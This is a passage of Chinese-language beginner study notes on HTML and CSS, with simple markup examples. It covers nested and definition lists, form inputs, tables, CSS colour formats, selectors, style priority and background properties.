<li><code>type=&quot;a&quot;</code>    a b c d</li>
<li><code>type=&quot;1&quot;</code>    1 2 3 4  默认值type=“I”    I II III type=“i”	 i ii iii</li>
</ul>
</li>
<li>
<p>列表嵌套</p>
</li>
<li>
<p>无序列表-嵌套</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line"> &lt;li&gt;柚子</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">   &lt;li&gt;沙田柚&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;蜜柚&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;&#x2F;ul&gt;</span><br><span class="line"> &lt;&#x2F;li&gt;</span><br><span class="line"> &lt;li&gt;荔枝&lt;&#x2F;li&gt;</span><br><span class="line"> &lt;li&gt;苹果&lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>有序列表-嵌套</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line"> &lt;li&gt;茶</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">   &lt;li&gt;红茶&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;绿茶&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;&#x2F;ul&gt;</span><br><span class="line"> &lt;&#x2F;li&gt;</span><br><span class="line"> &lt;li&gt;果汁&lt;&#x2F;li&gt;</span><br><span class="line"> &lt;li&gt;牛奶&lt;&#x2F;li&gt;&lt;&#x2F;ol&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义列表
<ul>
<li>定义列表不仅仅是一列项目，而是项目及其注释的组合。定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个定义列表项以 <code>&lt;dt&gt;</code>开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dl&gt;  </span><br><span class="line">     &lt;dt&gt;pc网页制作&lt;&#x2F;dt&gt;  </span><br><span class="line">     &lt;dd&gt;学习DIV+CSS JS JQ 项目实战&lt;&#x2F;dd&gt;  </span><br><span class="line">     &lt;dt&gt;手机网页制作&lt;&#x2F;dt&gt;  </span><br><span class="line">     &lt;dd&gt;手机网页制作实战&lt;&#x2F;dd&gt;</span><br><span class="line">&lt;&#x2F;dl&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>dd</code>是对<code>dt</code>的解释</p>
<ul>
<li><code>&lt; dl&gt;&lt; /dl&gt;</code>用来创建一个普通的列表,</li>
<li><code>&lt; dt&gt;&lt; /dt&gt;</code>用来创建列表中的上层项目，</li>
<li><code>&lt; dd&gt;&lt; /dd&gt;</code>用来创建列表中最下层项目，</li>
<li><code>&lt; dt&gt;&lt; /dt&gt;</code>和<code>&lt; dd&gt;&lt; /dd&gt;</code>都必须放在<code>&lt; dl&gt;&lt; /dl&gt;</code>标志对之间。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;中国城市&lt;&#x2F;dt&gt;</span><br><span class="line">    &lt;dd&gt;北京 &lt;&#x2F;dd&gt;</span><br><span class="line">    &lt;dd&gt;上海 &lt;&#x2F;dd&gt;</span><br><span class="line">    &lt;dd&gt;广州 &lt;&#x2F;dd&gt;</span><br><span class="line">    &lt;dt&gt;美国城市&lt;&#x2F;dt&gt;</span><br><span class="line">    &lt;dd&gt;华盛顿 &lt;&#x2F;dd&gt;</span><br><span class="line">    &lt;dd&gt;芝加哥 &lt;&#x2F;dd&gt;</span><br><span class="line">    &lt;dd&gt;纽约 &lt;&#x2F;dd&gt;</span><br><span class="line">&lt;&#x2F;dl&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>dl</code>是d<code>efinition list</code>的缩写</p>
</li>
<li>
<p><code>dt</code>是<code>definition title</code>的缩写</p>
</li>
<li>
<p><code>dd</code>是d<code>efinition description</code>的缩写</p>
</li>
<li>
<p><code>list-style</code>属性具有三个属性分量：</p>
</li>
<li>
<p><code>list-style-position</code> ：设置列表项图标的位置，位于文本内或者文本外</p>
</li>
<li>
<p><code>list-style-type</code>： 设置列表项图标的类型</p>
</li>
<li>
<p><code>list-style-image</code>：使用图像设置列表项图标</p>
</li>
</ul>
<hr />
<h4 id="第六章-表单元素上"><a class="markdownIt-Anchor" href="#第六章-表单元素上"></a> 第六章 表单元素(上)</h4>
<hr />
<ul>
<li>
<p>表单标签:</p>
<ul>
<li>
<p><code>&lt;form&gt;</code>表单标签</p>
<ul>
<li><code>&lt;form&gt;</code>表单是一个包含表单元素的区域，包括起来的都是表单的内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>HTML标签 - <code>Action</code>和确认按钮：
<ul>
<li>当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;html.do&quot; method&#x3D;&quot;get&quot;&gt;    </span><br><span class="line">        username:  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot; &#x2F;&gt;   </span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提  交&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>HTML</code>标签 - 隐藏域隐藏标签：</p>
</li>
<li>
<p>隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;        </span><br><span class="line">     &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;hid&quot; value&#x3D;&quot;value&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>&lt;input&gt;</code>标签的掌握</p>
<ul>
<li>
<p>常用<code>type</code>类型：</p>
<ul>
<li><code>&lt;input type=&quot;&quot; name=&quot;&quot; value=&quot;&quot; /&gt;</code></li>
<li><code>type=&quot;text&quot;</code>       单行文本输入框</li>
<li><code>type=&quot;password&quot;</code>	密码（<code>maxlength=&quot;&quot;</code>）</li>
<li><code>type=&quot;radio&quot;</code>     单项选择（<code>checked=&quot;checked&quot;</code>）</li>
<li><code>type=&quot;checkbox&quot;</code>   多项选择</li>
<li><code>type=&quot;button&quot;</code>	按钮</li>
<li><code>type=&quot;submit&quot;</code>	提交 <code>type=&quot;image&quot;</code>图片提交</li>
<li><code>type=&quot;file&quot;</code>	上传文件</li>
<li><code>type=&quot;reset&quot;</code>重置</li>
<li><code>type=&quot;hidden&quot;</code>	隐藏</li>
</ul>
</li>
</ul>
</li>
<li>
<p>关于表单中的设置默认值：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;今天心情不错&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; checked&#x3D;&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;&quot; value&#x3D;&quot;&quot; checked&#x3D;&quot;checked&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select name&#x3D;&quot;&quot; &gt;</span><br><span class="line"> &lt;option  value&#x3D;&quot;&quot;&gt;&lt;&#x2F;option&gt;</span><br><span class="line"> &lt;option  value&#x3D;&quot;&quot; selected&#x3D;&quot;selected&quot;&gt;&lt;&#x2F;option&gt;</span><br><span class="line">&lt;select&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>textarea</code>没有默认值</p>
</li>
<li>
<p><code>&lt;label&gt;</code>标签的使用</p>
<ul>
<li>
<p><code>&lt;label&gt;&lt;/label&gt;</code></p>
<ul>
<li><code>label</code> 元素不会向用户呈现任何特殊效果。</li>
<li>不过，它为鼠标用户改进了可用性。</li>
<li>如果您在 <code>label</code> 元素内点击文本，就会触发此控件。</li>
<li>就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。</li>
</ul>
</li>
<li>
<p><code>&lt;label&gt;</code> 标签的<code>for</code> 属性应当与相关元素的 <code>id</code>属性相同。</p>
</li>
<li>
<p>例子：（重要—注册表单–用户体验–必做）</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;单向选择&lt;&#x2F;p&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;male&quot;&gt;男：&lt;&#x2F;label&gt;&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot; id&#x3D;&quot;male&quot;&#x2F;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;nv&quot;&gt;女：&lt;&#x2F;label&gt;&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot;checked&#x3D;&quot;check&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<hr />
<h4 id="第七章-表单和表格下"><a class="markdownIt-Anchor" href="#第七章-表单和表格下"></a> 第七章 表单和表格(下)</h4>
<hr />
<ul>
<li>
<p>表单和表格标签：</p>
<ul>
<li><code>&lt;textarea&gt;</code>文本域标签</li>
<li><code>&lt;textarea&gt;</code>标签：</li>
<li><code>&lt;textarea&gt;&lt;/textarea&gt;</code>是文本域标签，可以在其中插入一段文字内容，它有两个常用属性<code>rows</code>和<code>cols</code></li>
</ul>
</li>
<li>
<p>注意：</p>
<ul>
<li><code>rows</code>表示这个文本域有多少行</li>
<li><code>cols</code>表示这个文本域有多少列</li>
</ul>
</li>
<li>
<p>除了这两个属性它还有<code>readonly</code>（只读，文本域的内容无法改变，相当于协议）和<code>title</code>（鼠标放上提示）</p>
</li>
<li>
<p><code>&lt;select&gt;</code>标签的掌握</p>
<ul>
<li>注：当提交表单时，浏览器会提交选定的项目，或者收集用逗号分隔的多个选项，将其合成一个单独的参数列表，并且在将 <code>&lt;select&gt;</code> 表单数据提交给服务器时包括 <code>name</code>属性</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;      </span><br><span class="line">    &lt;select name&#x3D;&quot;&quot;  id&#x3D;&quot;&quot;&gt;</span><br><span class="line">         &lt;option value&#x3D;&quot;1&quot;&gt;1月&lt;&#x2F;option&gt;  </span><br><span class="line">          &lt;option value&#x3D;&quot;2&quot;&gt;2月&lt;&#x2F;option&gt;      </span><br><span class="line">&lt;&#x2F;select&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>常用到的属性：<code>disabled=“disabled” name=&quot;sel&quot; size=&quot;2&quot;</code></p>
</li>
<li>
<p><code>&lt;table&gt;</code>表格标签</p>
</li>
<li>
<p><code>&lt;table&gt;</code>表格标签：<code>&lt;table&gt;</code>是表格标签，可以用它定义一个表格。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;姓名&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;td&gt;性别&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>注意：<code>&lt;table&gt;</code>的<code>border</code>属性不能少</p>
</li>
<li>
<p><code>&lt;tr&gt;</code> <code>&lt;td&gt;</code>标签的使用</p>
<ul>
<li>
<p><code>&lt;tr&gt;</code>行标签：</p>
<ul>
<li><code>&lt;tr&gt;</code>可以定义表格中的一行，一个&lt;<code>tr&gt;&lt;/tr&gt;</code>表示一行。</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line"> &lt;td&gt;姓名&lt;&#x2F;td&gt;</span><br><span class="line"> &lt;td&gt;性别&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;tr&gt;</span><br><span class="line"> &lt;td&gt;姓名&lt;&#x2F;td&gt;</span><br><span class="line"> &lt;td&gt;性别&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>&lt;td&gt;</code>单元格标签:</p>
<ul>
<li><code>&lt;td&gt;</code>可以定义表格中的一个单元格，<code>&lt;td&gt;&lt;/td&gt;</code>表示一个单元格。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td &gt;姓名&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;性别&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;爱好&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>border-collapse</code> 属性设置是否将表格边框折叠为单一边框：</li>
<li><code>border-collapse:collapse</code>;</li>
<li><code>colspan</code>左右合并</li>
<li><code>rowspan</code>上下合并</li>
</ul>
<p><strong>第一部分总结</strong>：</p>
<ul>
<li>
<p>非可视化标签：<code>head</code>  <code>meta</code>  <code>style</code>  <code>scrpit.</code>…</p>
</li>
<li>
<p>可视化标签：<code>img</code>  <code>div</code> <code>span</code> <code>a</code> <code>ul</code> <code>li</code>…</p>
</li>
<li>
<p>只有可视化标签，才能用<code>css</code>改变它</p>
</li>
<li>
<p>单标签：<code>meta</code>  <code>link</code>  <code>base</code>  <code>img</code>  <code>input</code> <code>br</code> <code>hr</code></p>
</li>
<li>
<p>双标签：<code>html</code> <code>head</code> <code>body</code>  <code>div</code>  <code>a</code>  <code>p</code>  <code>span</code> …<code>ul</code> <code>li</code> <code>ol</code> <code>dl</code> …</p>
</li>
<li>
<p><strong>常用可视化标签</strong></p>
<ul>
<li>** <code>div</code>**
<ul>
<li>一般用它来布局</li>
</ul>
</li>
<li><strong>a</strong>  超链接标签
<ul>
<li><code>href</code>*属性：设置跳转的网页地址</li>
<li><code>target</code>属性：设置跳转的目标</li>
<li>结论：凡事页面可以点击跳转或者表单提交的文字，都用<code>a</code>标签</li>
</ul>
</li>
<li><strong><code>img</code></strong>
<ul>
<li><code>src</code>*属性用来设置图片的url数据</li>
<li><code>alt</code>提供给搜索引擎搜索的</li>
<li><code>width</code></li>
<li><code>height</code></li>
<li>结论 ：显示图片</li>
</ul>
</li>
<li><strong>ul li</strong>
<ul>
<li>列表</li>
<li>结论：只要将来设计页面中有固定样式的列表，就用ul和li</li>
</ul>
</li>
<li><strong><code>table</code> <code>caption</code> <code>tr</code> <code>td (th)</code></strong>
<ul>
<li>慢慢已经被淘汰了 被ul li代替</li>
<li>如果是合并竖排的就是合并行（<code>rowspan</code>）</li>
<li>如果是合并横排的就是合并列（<code>colspan</code>）</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<p><strong>HTML部分导图总结</strong></p>
<hr />
<ul>
<li><a href="http://www.html5star.com/manual/html5label-meaning/" target="_blank" rel="noopener">HTML5标签集合</a></li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-1950ccf50810a92b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-3d15eb9c7be0cb65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-4b0073fd050ba4f3.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<hr />
<h3 id="第二部分-css"><a class="markdownIt-Anchor" href="#第二部分-css"></a> 第二部分 CSS</h3>
<hr />
<h4 id="第八章-css基础知识"><a class="markdownIt-Anchor" href="#第八章-css基础知识"></a> 第八章 css基础知识</h4>
<hr />
<ul>
<li><code>css</code>基础知识：
<ul>
<li><code>css</code>样式表的定义</li>
<li><code>css</code>：（Cascading Style Sheets）层叠样式表；</li>
</ul>
</li>
<li>分类及位置：内部样式<code>-head</code>区域<code>style</code>标签里面
<ul>
<li>外部样式-<code>link</code>调用</li>
<li>内联样式-标签元素里面</li>
</ul>
</li>
<li><code>css</code>内的注释：/<code>*</code>注释内容<code>*</code>/</li>
<li><code>css</code>样式表的语法
<ul>
<li>
<p><code>CSS</code>规则由两个主要的部分构成：要添加样式的盒子名或者标签名、和要添加的样式。</p>
</li>
<li>
<p>盒子名或者标签名{属性:值;}</p>
</li>
<li>
<p><strong>CSS中几种颜色的表示方法</strong></p>
<ul>
<li><strong>用颜色名表示</strong>
<ul>
<li>有17个预先确定的颜色，它们是
<ul>
<li><code>aqua</code>, <code>black</code>, <code>blue</code>, <code>fuchsia</code>, <code>gray</code>, <code>green</code>, <code>lime</code>, <code>maroon</code>, <code>navy</code>,<br />
　　<code>olive</code>, <code>orange,</code> <code>purple</code>, <code>red</code>, <code>silver</code>, <code>teal</code>, <code>white</code>, and <code>yellow</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>用十六进制的颜色值表示(红、绿、蓝)</strong></p>
<ul>
<li><code>#FF0000</code>或者<code>#F00</code></li>
</ul>
</li>
<li>
<p><strong>用rgb(r,g,b)函数表示</strong></p>
<ul>
<li>如：<code>rgb(255,255,0)</code></li>
</ul>
</li>
<li>
<p><strong>用hsl(Hue,Saturation,Lightness)函数表示（色调、饱和度、亮度)</strong></p>
<ul>
<li>如：<code>hsl(120,100%,100%)</code>,色调0代表红色，<code>120</code>代表绿色，<code>240</code>代表<br />
蓝色</li>
</ul>
</li>
<li>
<p><strong>用<code>rgba(r,g,b,a)</code>函数表示</strong></p>
<ul>
<li>其中<code>a</code>表示的是改颜色的透明度，取值范围是<code>0~1</code>，其中<code>0</code>代表完全透明</li>
</ul>
</li>
<li>
<p><strong>用hsla(Hue,Saturation,Lightness,alpha)函数表示</strong></p>
<ul>
<li>色调、饱和度、亮度、透明度</li>
</ul>
</li>
<li>
<p>例子</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position:absolute;top:0px"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:gray;"</span>&gt;</span>background-color:gray<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:#F00;"</span>&gt;</span>background-color:#F00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:#ffff00;"</span>&gt;</span>background-color:#ffff00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:rgb(255,0,255);"</span>&gt;</span>background-color:rgb(255,0,255)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:hsl(120,80%,50%);"</span>&gt;</span>background-color:hsl(120,80%,50%)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:rgba(255,0,255,0.5);"</span>&gt;</span>background-color:rgba(255,0,255,0.5)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color:hsla(120,80%,50%,0.5);"</span>&gt;</span>background-color:hsla(120,80%,50%,0.5)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-39e61a813f637282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<ul>
<li>内部样式表
<ul>
<li>当单个页面需要设置样式时，就应该使用内部样式表。</li>
<li>使用 <code>&lt;style&gt;&lt;/style&gt;</code>标签在文档<code>&lt;head&gt;&lt;/head&gt;</code>里面定义内部样式表</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;style type&#x3D;&quot;text&#x2F;css&quot; &gt;</span><br><span class="line">  p&#123;color:red;&#125;</span><br><span class="line"> &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>从外部引入到样式分为两种：（注意写在<code>head</code>标签里面）</p>
</li>
<li>
<p>当样式需要应用于很多页面时，就需要用到外部样式表，首先需要创建一个<code>css</code>文件，然后引用到我们的页面中。</p>
</li>
<li>
<p><code>Link</code>样式表式：  <code>&lt;link rel=”stylesheet” type=”text/css” href=”my.css”(href表示路径)&gt;</code></p>
</li>
<li>
<p><code>Html</code>式：  <code>&lt;style type=&quot;text/css&quot;&gt;@import url(&quot;css.css&quot;);&gt;&lt;/style&gt;</code></p>
</li>
<li>
<p>内联样式表（优先级高）</p>
<ul>
<li>
<p>写在标签里面的样式</p>
</li>
<li>
<p>如：<code>&lt;p style=&quot;color:red;&quot;&gt;&lt;/p&gt;</code></p>
</li>
</ul>
</li>
<li>
<p>表示给<code>p</code>标签里面的文字颜色设置为红色</p>
</li>
<li>
<p>区别：外链样式与导入样式</p>
<ul>
<li>
<p><code>link</code>标签是属于<code>xhtml</code>范畴，而<code>@import</code>则是<code>css2.1</code>中特有的。<code>link</code>标签除了可以加载<code>CSS</code>外，还可以做很多其它的事情，比如定义<code>RSS</code>，定义<code>rel</code>连接属性等，<code>@import</code>就只能加载<code>CSS</code>了。</p>
</li>
<li>
<p>加载的顺序的区别，<code>link</code>加载的<code>css</code>时，是一种并行(没有尝试是否是这样)加载<code>CSS</code>方式，而<code>@impor</code>则在整个页面加载完成后才加载。</p>
</li>
<li>
<p>兼容性的区别，因<code>@import``CSS2.1</code>才特有的，所以对于不兼容<code>CSS2.1</code>的浏览器来说，无效。</p>
</li>
<li>
<p>在样式控制上(比如动态改变网页的布局时,使用<code>javascript</code>操作<code>DOM</code>)的区别，此时<code>@import</code>就无能为力了。</p>
</li>
</ul>
</li>
</ul>
<hr />
<ul>
<li>
<p><strong>样式的优先级补充</strong></p>
<ul>
<li>相同权值情况下，<code>CSS</code>样式的优先级总结来说，就是——就近原则（离被设置元素越近优先级别越高）：
<ul>
<li><code>内联样式表（标签内部）</code> &gt; <code>嵌入样式表（当前文件中）</code>&gt; <code>外部样式表（外部文件中）</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>权值不同时，浏览器是根据权值来判断使用哪种<code>css</code>样式的，哪种样式权值高就使用哪种样式</p>
</li>
<li>
<p>层叠优先级是:</p>
</li>
<li>
<p><code>浏览器缺省</code>&lt; <code>外部样式表</code> &lt; <code>内部样式表</code> &lt; <code>内联样式</code></p>
</li>
<li>
<p>其中样式表又有:<code>类选择器</code> &lt; <code>类派生选择器</code>&lt;<code>ID选择器</code> &lt; <code>ID派生选择器</code></p>
</li>
<li>
<p>派生选择器以前叫上下文选择器，所以完整的层叠优先级是:</p>
</li>
<li>
<p><code>浏览器缺省</code> &lt;<code>外部样式表</code> &lt; <code>外部样式表类选择器</code> &lt; <code>外部样式表类派生选择器</code>&lt; <code>外部样式表ID选择器</code> &lt; <code>外部样式表ID派生选择器</code>&lt; <code>内部样式表</code> &lt; <code>内部样式表类选择器</code> &lt; <code>内部样式表类派生选择器</code> &lt; <code>内部样式表ID选择器</code> &lt; <code>内部样式表ID派生选择器</code> &lt; <code>内联样式</code>…共<code>12</code>个优先级</p>
</li>
<li>
<p>另外，如果同一个元素在没有其他样式的作用影响下，其<code>Class</code>定义了多个并以空格分开，其优先级顺序为：</p>
<ul>
<li>一个元素同时应用多个<code>class</code>，后定义的优先（即近者优先），加上<code>!important</code>者最优先！</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第九章-css选择器上"><a class="markdownIt-Anchor" href="#第九章-css选择器上"></a> 第九章 css选择器(上)</h4>
<ul>
<li>
<p><code>css</code>选择器：</p>
<ul>
<li><code>class</code>类选择器可以重复利用</li>
<li><code>id</code>选择器唯一</li>
</ul>
</li>
<li>
<p>标签选择器</p>
<ul>
<li>什么是选择器：css选择器就是要改变样式的对象</li>
</ul>
</li>
<li>
<p>选择器<code>{属性:值;属性:值;}</code></p>
</li>
<li>
<p>标签选择器：页面中所有的标签都是一个选择器  <code>p{color:red;}</code></p>
</li>
<li>
<p><code>ID</code>选择器</p>
<ul>
<li>选择<code>id</code>命名的元素 以 <code>#</code> 开头   <code>#p1{color:#0f0;}</code></li>
</ul>
</li>
<li>
<p>类选择器</p>
<ul>
<li><code>class</code>选择器，选择<code>clas</code>命名的元素 以<code>.</code>开头  <code>.first{color:#00f;}</code></li>
</ul>
</li>
<li>
<p><code>css</code>代码写完后上线前要经过压缩处理</p>
</li>
<li>
<p>本地和服务器分两个<code>css</code>版本（备份）</p>
</li>
<li>
<p>压缩后注释都清除，空间体积减少</p>
</li>
<li>
<p>群组选择器</p>
<ul>
<li>选择多个元素,以逗号隔开 <code>#main,.first,span,a,h1{color:red;}</code></li>
</ul>
</li>
<li>
<p>包含选择器</p>
<ul>
<li>选择某元素的后代元素，也称后代选择器，父类与子类间以空格隔开<code>p</code>
<ul>
<li><code>span{color:red;}</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>属性选择器</p>
<ul>
<li>选择包含某一属性的元素</li>
<li><code>a[title]{color:red;}</code>  选择包含<code>title</code>的<code>a</code>标签</li>
<li><code>a[title][href]{color:red;}</code> 选择包含<code>title</code>和<code>href</code>的<code>a</code>标签</li>
</ul>
</li>
<li>
<p><code>&gt;</code> <code>+</code> 选择器子类选择器：只选择子元素（只选择儿子）（相当于包含元素）</p>
<ul>
<li><code>p &gt; span{color:red;}</code></li>
</ul>
</li>
<li>
<p>相邻兄弟选择器：只选择后面的相邻兄弟元素</p>
<ul>
<li><code>p + span{color:red;}</code></li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十章-css选择器下"><a class="markdownIt-Anchor" href="#第十章-css选择器下"></a> 第十章 css选择器(下)</h4>
<hr />
<ul>
<li>
<p><code>&lt;a&gt;</code>伪类选择器</p>
<ul>
<li><code>a:link {color:#FF0000;}</code>	/* 未访问的链接 */ （只用于a标签）</li>
<li><code>a:visited {color:#00FF00;}</code>	/* 已访问的链接 */ （只用于a标签）</li>
<li><code>a:hover {color:#FF00FF;}</code>/* 鼠标移动到链接上</li>
<li><code>*/</code>（可和其他标签结合一起用）</li>
<li><code>a:active {color:#0000FF;}</code>	/* 选定的链接 */</li>
<li><strong>注意</strong>
<ul>
<li>伪类选择器的排序很重要，<code>a:link</code> <code>a:visited</code> <code>a:hover</code> <code>a:active</code>，记作<code>lvha</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>输入伪类选择器（针对表单）</p>
<ul>
<li><code>input:focus{color:red;}</code>      /* 键盘输入焦点 */</li>
</ul>
</li>
<li>
<p>其他伪类选择器</p>
<ul>
<li><code>p:first-child{color:red;}</code>     / * 第一个p */</li>
<li><code>:before</code> 在元素之前添加内容。</li>
<li><code>:after</code> 在元素之后添加内容。</li>
</ul>
</li>
<li>
<p><code>css</code>优先规则</p>
<ul>
<li>内联样式表-&gt; <code>ID</code> 选择器—&gt; <code>Class</code> 类选择器-&gt;标签选择器</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十一章-背景属性"><a class="markdownIt-Anchor" href="#第十一章-背景属性"></a> 第十一章 背景属性</h4>
<hr />
<ul>
<li>背景属性：
<ul>
<li>
<p>背景的添加 ：</p>
</li>
<li>
<p>背景颜色的添加:</p>
<ul>
<li><code>background:red;</code></li>
<li><code>backgronnd-color:red;</code></li>
</ul>
</li>
<li>
<p>背景图片的添加：</p>
<ul>
<li><code>background:url(“images/1.jpg”);</code></li>
<li><code>backgronnd-image:url(“images/1.jpg”);</code></li>
</ul>
</li>
<li>
<p>背景的平铺</p>
</li>
<li>
<p>什么是平铺？平铺就是图片是否重复出现</p>
<ul>
<li>不平铺：<code>background-repeat:no-repeat;</code></li>
<li>水平方向平铺：<code>background-repeat:repeat-x;</code></li>
